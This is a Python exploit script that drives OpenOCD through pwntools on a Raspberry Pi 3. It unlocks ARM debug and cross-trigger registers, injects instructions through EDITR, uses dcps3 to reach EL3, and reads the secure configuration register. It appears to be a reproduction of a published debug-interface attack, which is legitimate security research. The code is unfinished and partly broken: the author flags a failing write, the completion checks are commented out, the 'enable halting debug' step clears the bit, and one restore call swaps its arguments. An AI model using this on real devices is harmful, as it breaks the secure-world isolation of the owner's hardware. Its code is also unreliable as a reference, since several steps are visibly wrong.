import pwn, time
# 0x40030000 is the base address of the debug registers on Core 0
DEBUG_REGISTER_ADDR = 0x40030000
DEBUG_REGISTER_SIZE = 0x1000

# 0x40030000 is the base address of the cross trigger interface registers on Core 0
CTI_REGISTER_ADDR = 0x40038000
CTI_REGISTER_SIZE = 0x1000

# Offsets of debug registers
DBGDTRRX_OFFSET = 0x80
EDITR_OFFSET = 0x84
EDSCR_OFFSET = 0x88
DBGDTRTX_OFFSET = 0x8C
EDRCR_OFFSET = 0x90
OSLAR_OFFSET = 0x300
EDLAR_OFFSET = 0xFB0

# Bits in EDSCR
STATUS = 0x3f
ERR = 1 << 6
HDE = 1 << 14
ITE = 1 << 24

# Bits in EDRCR
CSE = 1 << 2

# Offsets of cross trigger registers
CTICONTROL_OFFSET = 0x0
CTIINTACK_OFFSET = 0x10
CTIAPPPULSE_OFFSET = 0x1C
CTIOUTEN0_OFFSET = 0xA0
CTIOUTEN1_OFFSET = 0xA4
CTITRIGOUTSTATUS_OFFSET = 0x134
CTIGATE_OFFSET = 0x140

# Bits in CTICONTROL
GLBEN = 1 << 0

# Bits in CTIINTACK
ACK0 = 1 << 0
ACK1 = 1 << 1

# Bits in CTIAPPPULSE
APPPULSE0 = 1 << 0
APPPULSE1 = 1 << 1

# Bits in CTIOUTEN<n>
OUTEN0 = 1 << 0
OUTEN1 = 1 << 1

# Bits in CTITRIGOUTSTATUS
TROUT0 = 1 << 0
TROUT1 = 1 << 1

# Bits in CTIGATE
GATE0 = 1 << 0
GATE1 = 1 << 1

# Values of EDSCR.STATUS
NON_DEBUG = 0x2
HLT_BY_DEBUG_REQUEST = 0x13
#this method is used to have a hex 8 byte representation of a number, this is useful
#to be used when sending a command to open ocd
def int_t0_string_hex(num):
    return "0x"+format(num, '08x')


#method used to write a 32 bit value to a specific address using open ocd
def write32(val,address,p):
    p.read(1)
    command='mww phys '+int_t0_string_hex(address)+' ' +int_t0_string_hex(val)+ ' 1'
    print(command)
    p.sendline(command)
    p.recvuntil(b'\r>')
    time.sleep(0.2)


#method used to read a 32 bit value from a specific address using open ocd
def read32(address,p):
    command='mdw phys '+int_t0_string_hex(address)+ ' 1'
    print(command)
    p.sendline(command)
    result=p.recvuntil(b'\r>')
    result=result[38:-5]
    result_str ="0x"+ result.decode('utf-8')
    num=int(result_str,16)
    time.sleep(0.2)
    return num



def execute_ins_via_itr(ins,p):
    #CLEAR PREVIOUS ERROR
    write32(CSE,DEBUG_REGISTER_ADDR+EDRCR_OFFSET,p)
    input("test_write_editir")
    #WWrite instruction to EDITIR register to execute it
    #The problem is here, cannot write the instruction to the register
    print(read32(DEBUG_REGISTER_ADDR+EDITR_OFFSET,p))
    write32(ins,DEBUG_REGISTER_ADDR+EDITR_OFFSET,p)
    print(read32(DEBUG_REGISTER_ADDR+EDITR_OFFSET,p))
    time.sleep(0.2)
    #Wait until the execution is finished
    reg=read32(DEBUG_REGISTER_ADDR+EDSCR_OFFSET,p)
    time.sleep(0.2)
    # print(reg)
    # while (reg & ITE) != ITE:
    #     reg=read32(DEBUG_REGISTER_ADDR+EDSCR_OFFSET,p)
    #     print(hex(reg & ITE) + " " + hex(ITE))
    #     time.sleep(0.2)
    # time.sleep(0.2)
    # if((reg & ERR) == ERR):
    #     print("Error in execution")
    #     return -1
    # time.sleep(0.2)
    

def save_register(ins,p):
    #execite the ins to copy the target to r0
    execute_ins_via_itr(ins,p)

    #copy r0 ti DCC register DBGDTRTX
    #0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(0x0e15ee00,p)
    return read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)


def restore_register(val,ins,p):
    #copy the value from DCC rDBGDTRRX via the memory mapped interface
    write32(val,DEBUG_REGISTER_ADDR+DBGDTRRX_OFFSET,p)
    time.sleep(0.2)
    #Copy the DCC register DBGDTRRX to R0
    # 0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(0x0e15ee10,p)
    execute_ins_via_itr(ins,p)


def change_target(target,p):
    command= "targets rpi3.a53." +str(target)
    print(command)
    p.sendline(command)
    result=p.recvuntil(b'\r>')

def halt(p):
    command='halt'
    p.sendline(command)
    result=p.recvuntil(b'\r>')

def resume(p):
    command='resume'
    p.sendline(command)
    result=p.recvuntil(b'\r>')

def read_scr(p):
    #in the original attack there is a procedure to halt the debug that involve
    #writing in some specific register, but i think that in our case we can directly
    #use the halt openocd comand
    #according to the openocd documentation, the halt command can have some issue with arm 
    #processor, so if there are problem check here and follow the original procedure
    input("Step 0 change the target to cpu 0\n")
    change_target(0,p)
    #halt the core
    #the easy way does not work
    #input("Step 1 to 4 halt the debugger\n")
    input("halt processor 0")
    
    halt(p)
    
    
    #Step 1: Unlock debug and cross trigger reigsters
    input("Step 1: Unlock debug and cross trigger registers\n")
    write32(0xc5acce55, DEBUG_REGISTER_ADDR + EDLAR_OFFSET,p)
    input("1.1")
    write32(0xc5acce55, CTI_REGISTER_ADDR + EDLAR_OFFSET,p)
    input("1.2")
    write32(0x0, DEBUG_REGISTER_ADDR + OSLAR_OFFSET,p)
    input("1.3")
    write32(0x0,  CTI_REGISTER_ADDR + OSLAR_OFFSET,p)


    #Step 2: Enable halting debug on the target processor
    input( "Step 2: Enable halting debug\n")
    reg = read32(DEBUG_REGISTER_ADDR + EDSCR_OFFSET,p)
    print(hex(reg))
    reg &= ~HDE
    print(hex(reg))
    input("2.1")
    write32(reg, DEBUG_REGISTER_ADDR + EDSCR_OFFSET,p)
    reg = read32(DEBUG_REGISTER_ADDR + EDSCR_OFFSET,p)
    print(hex(reg))

    
    #Step 5: Save context of the target core
    input("Step 5: Save context")
    #0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(0x0e15ee00,p)
    input("5.1")
    r0_old = read32(DEBUG_REGISTER_ADDR + DBGDTRTX_OFFSET,p)
    #0xee740f35 <=> mrc p15, 3, R0, c4, c5, 1
    input("5.2")
    dlr_old = save_register(0x0f35ee74,p)


    #Step 6: Switch to EL3 to access secure resource
    input("Step 6: Switch to EL3\n")
    # 0xf78f8003 <=> dcps3
    execute_ins_via_itr(0x8003f78f,p)   
    
    #Step 7: Read the SCR
    input("Step 7: Read SCR\n")
    #0xee110f11 <=> mrc p15, 0, R0, c1, c1, 0
    execute_ins_via_itr(0x0f11ee11,p)
    input("7.1")

    # 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(0x0e15ee00,p)

    input("7.2")
    scr = read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)
    
    #Step 8: Restore context
    input("Step 8: Restore context\n")
    #0x0f35ee64 <=> mcr p15, 3, R0, c4, c5, 1
    restore_register(0x0f35ee64, dlr_old,p)
    input("8.1")
    write32(r0_old, DEBUG_REGISTER_ADDR + DBGDTRRX_OFFSET,p)
    input("8.2")
    #0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(0x0e15ee10,p)
    #step 9 and 10 restart the processor,also here i'm using  the proce
    input("8.3")
    resume(p)
    print("All done, the scr value is:" + int_t0_string_hex(scr))

\
    


telnet_process = pwn.process(['telnet', 'localhost', '4444'])
telnet_process.recvuntil(b'\r>')

read_scr(telnet_process)
#change_target(0,telnet_process)
#print(read32(DEBUG_REGISTER_ADDR + DBGDTRTX_OFFSET,telnet_process))